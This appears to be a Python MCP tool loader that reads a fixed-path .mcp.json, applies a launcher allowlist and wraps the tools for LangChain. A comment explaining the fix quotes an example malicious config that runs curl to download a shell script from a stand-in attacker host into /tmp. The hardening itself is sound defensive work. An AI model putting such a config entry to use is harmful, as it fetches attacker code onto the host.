"""MCP 工具加载器：从 .mcp.json 配置发现并加载外部 MCP 工具。"""

import asyncio
import json
import os
import sys
from pathlib import Path
from typing import Any

from app.core.config import settings
from app.core.logging import logger

try:
    from mcp import ClientSession
    from mcp.client.sse import sse_client
    from mcp.client.streamable_http import streamablehttp_client
    from mcp.client.stdio import stdio_client
    from mcp.types import Tool as MCPTool

    _MCP_AVAILABLE = True
except ImportError:  # pragma: no cover
    _MCP_AVAILABLE = False
    ClientSession = None  # type: ignore[misc,assignment]
    MCPTool = None  # type: ignore[misc,assignment]


# MCP 配置只从可信固定路径加载。
#
# 之前 ``Path.cwd() / ".mcp.json"`` 让任何 agent 都能通过写入工作目录的
# ``.mcp.json`` 让宿主在加载 MCP 工具时执行任意命令（``"command": "curl",
# "args": ["http://attacker/sh", "-o", "/tmp/sh"]``）。现在仅信任用户主目录
# 下的固定位置；工作目录内的配置被显式忽略。
_DEFAULT_MCP_JSONS = [
    Path.home() / ".deepagents" / ".mcp.json",
]

# stdio transport 允许的可执行命令白名单。MCP 是长生命周期子进程，``command``
# 直接进入 ``subprocess`` argv，因此默认只放行常见的 MCP server 启动器。
# 运维如需扩展应改 ``settings``，而不是放开默认值。
_ALLOWED_STDIO_COMMANDS = {
    "npx", "node", "python", "python3", "uvx", "uv", "docker",
}


def _validate_server_config(name: str, server_config: dict[str, Any]) -> bool:
    """Reject MCP server configs that would execute arbitrary commands."""
    transport = server_config.get("transport", "stdio")
    if transport not in ("stdio", "sse", "streamable_http"):
        logger.warning(f"MCP server '{name}': unsupported transport '{transport}'")
        return False
    if transport == "stdio":
        command = server_config.get("command")
        if not command or not isinstance(command, str):
            logger.warning(f"MCP server '{name}': stdio transport requires a 'command' string")
            return False
        # Resolve the bare executable name the same way a shell would so that
        # ``./evil`` or ``/usr/bin/curl`` cannot bypass the allowlist by
        # passing an absolute path.
        executable = Path(command).name.lower()
        for suffix in (".exe", ".cmd", ".bat"):
            executable = executable.removesuffix(suffix)
        if executable not in _ALLOWED_STDIO_COMMANDS:
            logger.warning(
                f"MCP server '{name}': command '{command}' not in allowlist "
                f"{sorted(_ALLOWED_STDIO_COMMANDS)}; refusing to start"
            )
            return False
    return True


def _load_mcp_config() -> dict[str, Any] | None:
    """按优先级查找并加载 .mcp.json 配置。"""
    for path in _DEFAULT_MCP_JSONS:
        if path.exists():
            try:
                text = path.read_text(encoding="utf-8")
                data = json.loads(text)
                if isinstance(data, dict):
                    # Filter out any server entry that fails validation so a
                    # single bad entry cannot execute arbitrary commands on
                    # load.  ``mcpServers`` is the conventional MCP shape;
                    # other top-level keys are passed through unchanged.
                    servers = data.get("mcpServers")
                    if isinstance(servers, dict):
                        safe_servers: dict[str, Any] = {}
                        for name, cfg in servers.items():
                            if isinstance(cfg, dict) and _validate_server_config(name, cfg):
                                safe_servers[name] = cfg
                        data["mcpServers"] = safe_servers
                    return data
            except Exception as exc:
                logger.warning(f"读取 MCP 配置失败 {path}: {exc}")
    return None


def _apply_filter(
    tools: list[MCPTool], allowed: list[str] | None, disabled: list[str] | None
) -> list[MCPTool]:
    """根据 allowedTools / disabledTools 过滤工具。"""
    if not allowed and not disabled:
        return tools
    allowed_set = set(allowed or [])
    disabled_set = set(disabled or [])
    result = []
    for t in tools:
        name = t.name
        if disabled_set and name in disabled_set:
            continue
        if allowed_set and name not in allowed_set:
            continue
        result.append(t)
    return result


async def _list_mcp_tools_async(
    server_config: dict[str, Any],
) -> list[MCPTool]:
    """异步连接到 MCP 服务器并列出可用工具。"""
    transport = server_config.get("transport", "stdio")
    if not _MCP_AVAILABLE:
        logger.warning("mcp 库未安装，跳过 MCP 工具加载。")
        return []

    if transport not in ("stdio", "sse", "streamable_http"):
        logger.warning(f"不支持的 MCP transport: {transport}")
        return []

    client_ctx = None
    try:
        if transport == "stdio":
            command = server_config.get("command")
            args = server_config.get("args", [])
            env = server_config.get("env", {})
            if not command:
                logger.warning("stdio transport 需要 'command' 字段。")
                return []
            # Defense in depth: re-validate at the execution boundary in case
            # this entry point is reached without going through
            # ``_load_mcp_config`` (e.g. caller-built dict).  Refuse to spawn
            # any command outside the allowlist.
            executable = Path(command).name.lower()
            for suffix in (".exe", ".cmd", ".bat"):
                executable = executable.removesuffix(suffix)
            if executable not in _ALLOWED_STDIO_COMMANDS:
                logger.warning(
                    f"stdio MCP command '{command}' not in allowlist; refusing to start"
                )
                return []
            client_ctx = stdio_client(
                command=command,
                arguments=args,
                env={**os.environ, **env},
            )
        elif transport == "sse":
            url = server_config.get("url")
            headers = server_config.get("headers", {})
            if not url:
                logger.warning("sse transport 需要 'url' 字段。")
                return []
            client_ctx = sse_client(url=url, headers=headers)
        elif transport == "streamable_http":
            url = server_config.get("url")
            headers = server_config.get("headers", {})
            if not url:
                logger.warning("streamable_http transport 需要 'url' 字段。")
                return []
            client_ctx = streamablehttp_client(url=url, headers=headers)
        else:
            return []

        if client_ctx is None:
            return []

        async with client_ctx as (read_stream, write_stream):
            async with ClientSession(read_stream, write_stream) as session:
                await session.initialize()
                list_result: Any = await session.list_tools()
                return list(getattr(list_result, "tools", []))
    except Exception as exc:
        logger.warning(f"连接 MCP 服务器失败: {exc}")
        return []


def load_mcp_tools() -> list[Any]:
    """加载所有 MCP 工具，转换为 LangChain Tool 列表。"""
    if not settings.enable_mcp_tools:
        return []

    config = _load_mcp_config()
    if not config:
        logger.info("未找到 .mcp.json，跳过 MCP 工具加载。")
        return []

    servers = config.get("mcpServers", {})
    if not servers:
        logger.info(".mcp.json 中未配置 mcpServers。")
        return []

    all_tools: list[Any] = []
    for server_name, server_cfg in servers.items():
        if not isinstance(server_cfg, dict):
            continue
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                import concurrent.futures
                future = asyncio.run_coroutine_threadsafe(
                    _list_mcp_tools_async(server_cfg),
                    loop,
                )
                raw_tools = future.result(timeout=30)
            else:
                raw_tools = loop.run_until_complete(_list_mcp_tools_async(server_cfg))
        except Exception as exc:
            logger.warning(f"加载 MCP 工具失败 ({server_name}): {exc}")
            continue

        allowed = server_cfg.get("allowedTools", [])
        disabled = server_cfg.get("disabledTools", [])
        filtered = _apply_filter(raw_tools, allowed, disabled)

        for mcp_tool in filtered:
            try:
                tool = _convert_mcp_tool_to_langchain(mcp_tool, server_cfg)
                if tool:
                    all_tools.append(tool)
            except Exception as exc:
                logger.warning(f"转换 MCP 工具失败 ({mcp_tool.name}): {exc}")

    return all_tools


def _convert_mcp_tool_to_langchain(mcp_tool: Any, server_cfg: dict[str, Any]) -> Any | None:
    """将单个 MCP Tool 转换为 LangChain Tool，并缓存服务器连接信息。"""
    if not _MCP_AVAILABLE:
        return None

    from langchain.tools import StructuredTool
    from pydantic import BaseModel, Field

    schema = getattr(mcp_tool, "inputSchema", {}) or {}
    props = schema.get("properties", {})
    required_fields = schema.get("required", [])

    field_defs: dict[str, Any] = {"__module__": __name__}
    for field_name, field_info in props.items():
        field_type = field_info.get("type", "string")
        description = field_info.get("description", "")
        is_required = field_name in required_fields

        if field_type == "string":
            py_type = str
        elif field_type == "integer":
            py_type = int
        elif field_type == "number":
            py_type = float
        elif field_type == "boolean":
            py_type = bool
        elif field_type == "array":
            py_type = list
        elif field_type == "object":
            py_type = dict
        else:
            py_type = str

        if is_required:
            field_defs[field_name] = (py_type, Field(..., description=description))
        else:
            field_defs[field_name] = (py_type | None, Field(default=None, description=description))

    try:
        model_cls = type("MCPToolInput", (BaseModel,), field_defs)
    except Exception:
        return None

    final_description = getattr(mcp_tool, "description", "") or mcp_tool.name

    def _run_mcp_tool(**kwargs: Any) -> str:
        try:
            validated = model_cls(**kwargs)
            call_args = validated.model_dump(exclude_none=True)
        except Exception as exc:
            return f"参数校验失败: {exc}"

        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                import concurrent.futures
                future = asyncio.run_coroutine_threadsafe(
                    _call_mcp_tool(server_cfg, mcp_tool.name, call_args),
                    loop,
                )
                response = future.result(timeout=60)
            else:
                response = loop.run_until_complete(
                    _call_mcp_tool(server_cfg, mcp_tool.name, call_args)
                )
        except RuntimeError:
            new_loop = asyncio.new_event_loop()
            response = new_loop.run_until_complete(
                _call_mcp_tool(server_cfg, mcp_tool.name, call_args)
            )
            new_loop.close()
        except Exception as exc:
            return f"调用 MCP 工具失败: {exc}"

        try:
            content = response.content
            if hasattr(content, "text"):
                return content.text
            if isinstance(content, list):
                parts = []
                for item in content:
                    if hasattr(item, "text"):
                        parts.append(item.text)
                    elif isinstance(item, dict):
                        parts.append(item.get("text", str(item)))
                    else:
                        parts.append(str(item))
                return "\n".join(parts)
            return str(content)
        except Exception as exc:
            return f"解析 MCP 响应失败: {exc}"

    return StructuredTool.from_function(
        name=mcp_tool.name,
        func=_run_mcp_tool,
        description=final_description,
        args_schema=model_cls,
    )


async def _call_mcp_tool(server_cfg: dict[str, Any], tool_name: str, arguments: dict[str, Any]) -> Any:
    """建立临时 MCP 连接并调用工具。"""
    transport = server_cfg.get("transport", "stdio")
    client_ctx = None

    try:
        if transport == "stdio":
            command = server_cfg.get("command")
            args = server_cfg.get("args", [])
            env = server_cfg.get("env", {})
            if not command:
                raise ValueError("stdio 需要 command")
            client_ctx = stdio_client(command=command, arguments=args, env={**os.environ, **env})
        elif transport == "sse":
            url = server_cfg.get("url")
            headers = server_cfg.get("headers", {})
            client_ctx = sse_client(url=url, headers=headers)
        elif transport == "streamable_http":
            url = server_cfg.get("url")
            headers = server_cfg.get("headers", {})
            client_ctx = streamablehttp_client(url=url, headers=headers)
        else:
            raise ValueError(f"不支持的 transport: {transport}")

        if client_ctx is None:
            raise ValueError("client context 创建失败")

        async with client_ctx as (read_stream, write_stream):
            async with ClientSession(read_stream, write_stream) as session:
                await session.initialize()
                return await session.call_tool(tool_name, arguments)
    except Exception as exc:
        logger.error(f"MCP 工具调用失败 ({tool_name}): {exc}")
        raise
